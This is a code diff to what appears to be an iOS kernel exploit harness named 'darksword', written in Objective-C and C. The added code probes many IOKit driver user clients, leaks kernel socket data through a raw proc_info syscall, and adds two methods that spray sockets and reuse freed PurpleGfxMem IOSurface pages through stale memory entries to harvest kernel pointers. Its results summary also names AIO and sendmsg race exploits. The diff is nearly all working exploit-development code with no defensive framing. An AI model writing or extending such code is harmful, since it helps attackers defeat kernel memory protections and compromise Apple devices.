@@ -448,28 +448,47 @@ static bool test_iokit_service(const char *name, const char *path, uint32_t type
     return true;
 }
 
+static void try_open_service(const char *name, uint32_t type, bool multiType) {
+    io_service_t svc = IOServiceGetMatchingService(MACH_PORT_NULL,
+        IOServiceNameMatching(name));
+    if (!svc) {
+        if (!multiType) printf("[IOKit] %s: not found\n", name);
+        return;
+    }
+    if (multiType) {
+        for (uint32_t t = 0; t <= 3; t++) {
+            io_connect_t conn = 0;
+            kern_return_t kr = IOServiceOpen(svc, mach_task_self_, t, &conn);
+            printf("[IOKit] %s type=%u: %s (conn=%#x, kr=%#x)\n",
+                   name, t, kr == KERN_SUCCESS ? "OPENED" : "no UC", conn, kr);
+            if (conn) IOServiceClose(conn);
+        }
+    } else {
+        io_connect_t conn = 0;
+        kern_return_t kr = IOServiceOpen(svc, mach_task_self_, type, &conn);
+        printf("[IOKit] %s: %s (conn=%#x, kr=%#x)\n",
+               name, kr == KERN_SUCCESS ? "OPENED" : "no UC", conn, kr);
+        if (conn) IOServiceClose(conn);
+    }
+    IOObjectRelease(svc);
+}
+
 static void diagnostic_iokit(void) {
     printf("\n=== IOKit Diagnostic ===\n");
-    // Try many service names to find what's accessible
     const char *svcNames[] = {
         "IOSurfaceRoot", "AppleJPEGDriver", "AGXDevice", "AGX14Device",
         "AGX13Device", "H11ANEIn", "H11ANE", "AppleANE",
         "IOAudioEngine", "IOHDACodecDriver", "AppleT8112Device",
         "IOPlatformExpertDevice", "AppleEmbeddedSPI",
+        "AppleCL2", "AppleDCP", "AppleAVE2Driver", "AppleH11CameraInterface",
+        "AppleSPUDevice", "AppleDCPExtension", "AppleCSIReceiver",
+        "AppleSmartIO2", "AppleT8112DART", "IOGPU",
     };
     for (int i = 0; i < sizeof(svcNames)/sizeof(svcNames[0]); i++) {
-        io_service_t svc = IOServiceGetMatchingService(MACH_PORT_NULL,
-            IOServiceNameMatching(svcNames[i]));
-        if (svc) {
-            io_connect_t conn = 0;
-            kern_return_t kr = IOServiceOpen(svc, mach_task_self_, 0, &conn);
-            printf("[IOKit] %s: %s (conn=%#x, kr=%#x)\n",
-                   svcNames[i], kr == KERN_SUCCESS ? "OPENED" : "no UC", conn, kr);
-            if (conn) IOServiceClose(conn);
-            IOObjectRelease(svc);
-        } else {
-            printf("[IOKit] %s: not found\n", svcNames[i]);
-        }
+        if (strcmp(svcNames[i], "H11ANE") == 0)
+            try_open_service(svcNames[i], 0, true);
+        else
+            try_open_service(svcNames[i], 0, false);
     }
     printf("=== IOKit Diagnostic Complete ===\n\n");
 }
@@ -847,26 +866,137 @@ static bool method_proc_info(void) {
         printf("[proc_info] socket failed\n");
         return false;
     }
-    fileport_t fp = 0;
-    fileport_makeport(fd, &fp);
-    close(fd);
 
     uint8_t buf[0x400];
-    int r = syscall(336, 6, getpid(), 3, fp, buf, sizeof(buf));
-    mach_port_deallocate(mach_task_self_, fp);
+    // proc_info(callnum=6=PROC_INFO_CALL_PIDFDINFO, pid, flavor=2=PROC_PIDFDSOCKET_IPCINFO, fd, buf, bufsize)
+    int r = syscall(336, 6, getpid(), 2, (uint64_t)(intptr_t)fd, (uint64_t)(uintptr_t)buf, (uint32_t)sizeof(buf));
     if (r != 0) {
-        printf("[proc_info] syscall failed: %d\n", r);
+        printf("[proc_info] syscall failed: %d (errno=%d)\n", r, errno);
+        close(fd);
         return false;
     }
     uint64_t gencnt = *(uint64_t*)(buf + 0x110);
     printf("[proc_info] inp_gencnt=0x%llx\n", gencnt);
-    // Print some fields
     for (int off = 0; off < 0x400; off += 8) {
         uint64_t v = *(uint64_t*)(buf + off);
         if (v) printf("[proc_info] +%#x = 0x%016llx\n", off, v);
     }
     printf("[proc_info] success (kernel data received)\n");
+    close(fd);
     return true;
+}
+
+// Method 5: PurpleGfxMem overlap — tests if IOGPU-backed pages retain data after free
+static bool method_purple_mem(void) {
+    printf("\n[Method: PurpleMem] Testing PurpleGfxMem page reuse...\n");
+    mach_vm_size_t sz = 4 * 1024 * 1024; // 4 MB
+    NSDictionary *params = @{
+        (__bridge id)kIOSurfaceAllocSize : @(sz),
+        @"IOSurfaceMemoryRegion" : @"PurpleGfxMem",
+    };
+    IOSurfaceRef surfA = IOSurfaceCreate((__bridge CFDictionaryRef)params);
+    if (!surfA) { printf("[PurpleMem] IOSurfaceCreate failed\n"); return false; }
+
+    void *addr0 = IOSurfaceGetBaseAddress(surfA);
+    randomMarker = (uint64_t)arc4random() << 32 | arc4random();
+    printf("[PurpleMem] addr0=%p marker=0x%016llx\n", addr0, randomMarker);
+    memset64(addr0, randomMarker, sz);
+
+    // Create memory entries for every page
+    int nPages = 64;
+    mach_port_t entries[64] = {};
+    for (int i = 0; i < nPages; i++) {
+        mach_vm_size_t pg = PAGE_SIZE;
+        kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &pg,
+            (mach_vm_address_t)addr0 + i * PAGE_SIZE, VM_PROT_DEFAULT, &entries[i], 0);
+        if (kr != KERN_SUCCESS) { entries[i] = MACH_PORT_NULL; nPages = i; break; }
+    }
+    printf("[PurpleMem] %d memory entries created\n", nPages);
+
+    CFRelease(surfA);
+    printf("[PurpleMem] Surface A released\n");
+
+    // Spray sockets to pressure allocator
+    socketPorts = [NSMutableArray new];
+    socketPcbIds = [NSMutableArray new];
+    int nSpray = 0;
+    for (int i = 0; i < 10240 * 3 - 4096 * 2; i++) {
+        if (spray_socket() == -1) break;
+        nSpray++;
+    }
+    printf("[PurpleMem] sprayed %d sockets\n", nSpray);
+
+    // Create new PurpleGfxMem surface (hopefully reuses some pages)
+    IOSurfaceRef surfB = IOSurfaceCreate((__bridge CFDictionaryRef)params);
+    if (!surfB) {
+        printf("[PurpleMem] Surface B create failed\n");
+        sockets_release();
+        for (int i = 0; i < nPages; i++) if (entries[i]) mach_port_deallocate(mach_task_self_, entries[i]);
+        return false;
+    }
+    void *addr1 = IOSurfaceGetBaseAddress(surfB);
+    printf("[PurpleMem] addr1=%p\n", addr1);
+
+    // Map each old entry and check for non-marker data
+    int hits = 0, ptrHits = 0;
+    for (int i = 0; i < nPages; i++) {
+        if (!entries[i]) continue;
+        mach_vm_address_t va = 0;
+        mach_vm_size_t pgSz = PAGE_SIZE;
+        kern_return_t kr = mach_vm_map(mach_task_self_, &va, pgSz, 0,
+            VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, entries[i], 0, 0,
+            VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
+        if (kr != KERN_SUCCESS) continue;
+
+        uint64_t v = *(uint64_t*)va;
+        if (v != randomMarker) {
+            hits++;
+            if ((v >> 40) == 0xFFFFFF) {
+                printf("[PurpleMem] KPTR at entry %d: 0x%016llx\n", i, v);
+                ptrHits++;
+            } else if (hits <= 20) {
+                printf("[PurpleMem] non-marker at entry %d: 0x%016llx\n", i, v);
+            }
+        }
+        mach_vm_deallocate(mach_task_self_, va, PAGE_SIZE);
+    }
+    printf("[PurpleMem] total non-marker entries: %d (kernel pointers: %d)\n", hits, ptrHits);
+
+    for (int i = 0; i < nPages; i++) if (entries[i]) mach_port_deallocate(mach_task_self_, entries[i]);
+    CFRelease(surfB);
+    sockets_release();
+    return hits > 0;
+}
+
+// Method 6: IOGPU memory info leak — check freshly allocated PurpleGfxMem pages for residual kernel data
+static bool method_purple_info_leak(void) {
+    printf("\n[Method: PurpleLeak] Checking fresh PurpleGfxMem pages for residual data...\n");
+    mach_vm_size_t sz = 2 * 1024 * 1024;
+    NSDictionary *params = @{
+        (__bridge id)kIOSurfaceAllocSize : @(sz),
+        @"IOSurfaceMemoryRegion" : @"PurpleGfxMem",
+    };
+
+    int ptrsFound = 0;
+    for (int trial = 0; trial < 5; trial++) {
+        IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)params);
+        if (!surf) continue;
+        void *addr = IOSurfaceGetBaseAddress(surf);
+        uint64_t *words = (uint64_t *)addr;
+        uint64_t n = sz / 8;
+        for (uint64_t i = 0; i < n; i++) {
+            uint64_t v = words[i];
+            if (v && (v >> 40) == 0xFFFFFF) {
+                printf("[PurpleLeak] trial %d KPTR at +%#llx: 0x%016llx\n", trial, i * 8, v);
+                ptrsFound++;
+                if (ptrsFound >= 10) break;
+            }
+        }
+        CFRelease(surf);
+        if (ptrsFound >= 10) break;
+    }
+    printf("[PurpleLeak] kernel pointers found: %d\n", ptrsFound);
+    return ptrsFound > 0;
 }
 
 bool run_darksword(void) {
@@ -896,11 +1026,19 @@ bool run_darksword(void) {
     // Phase 4: proc_info
     bool pi = method_proc_info();
 
-    // Phase 5: AppleJPEGDriver IOKit fuzzing
+    // Phase 5: PurpleGfxMem overlap
+    bool purp = method_purple_mem();
+
+    // Phase 6: PurpleGfxMem info leak (raw fresh pages)
+    bool purpLeak = method_purple_info_leak();
+
+    // Phase 7: AppleJPEGDriver IOKit fuzzing
     method_apple_jpeg_fuzz();
 
     printf("=== Results ===\n");
     printf("SystemMemory overlap: %d\n", sysmem);
+    printf("PurpleGfxMem overlap: %d\n", purp);
+    printf("PurpleGfxMem info leak: %d\n", purpLeak);
     printf("AIO exploit: %d\n", aio);
     printf("sendmsg race: %d\n", sendmsg);
     printf("proc_info: %d\n", pi);
